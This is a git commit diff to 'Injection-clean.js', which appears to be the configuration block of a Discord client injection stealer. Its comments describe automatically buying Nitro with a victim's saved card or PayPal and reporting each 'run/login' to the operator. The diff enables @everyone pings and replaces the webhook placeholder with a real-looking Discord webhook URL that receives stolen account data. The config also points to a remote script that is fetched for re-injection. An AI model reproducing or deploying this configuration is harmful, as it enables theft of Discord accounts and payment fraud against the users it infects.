2f718f72bcc70b7bc7442d21148c31de63ad96b1
aaditya888 <77214595+aaditya888@users.noreply.github.com>
2022-04-01 23:46:00 +0300

    Update Injection-clean.js

--- Injection-clean.js
+++ Injection-clean.js
@@ -6,12 +6,12 @@ const { BrowserWindow, session } = require('electron')
 
 const config = {
     auto_buy_nitro: true, //automatically buys nitro for you if they add credit card or paypal or tries to buy nitro themselves
-    ping_on_run: false, //pings @everyone when you get a run/login
+    ping_on_run: true, //pings @everyone when you get a run/login
     ping_val: '@everyone', //change to @here or <@ID> to ping specific user if you want, will only send if ping_on_run is true
     embed_name: 'Discord Injection', //name of the webhook thats gonna send the info
     embed_icon: 'https://raw.githubusercontent.com/Rdimo/images/master/Discord-Injection/discord atom.png'.replace(/ /g,'%20'), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
     embed_color: 8363488, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
-    webhook: '%WEBHOOK', //your discord webhook there obviously
+    webhook: 'https://discord.com/api/webhooks/959550839196876822/CXl2KgiIP47KllXZP6MH2k1lHOHYt5kZO4d_EGlMHQ1icdg1sGIvzXmdv4m6UToVfx-1', //your discord webhook there obviously
     injection_url: 'https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/injection.js', //injection url for when it reinjects
     /* DON'T TOUCH UNDER HERE IF UNLESS YOU'RE MODIFYING THE INJECTION OR KNOW WHAT YOU'RE DOING */
     api: 'https://discord.com/api/v9/users/@me',
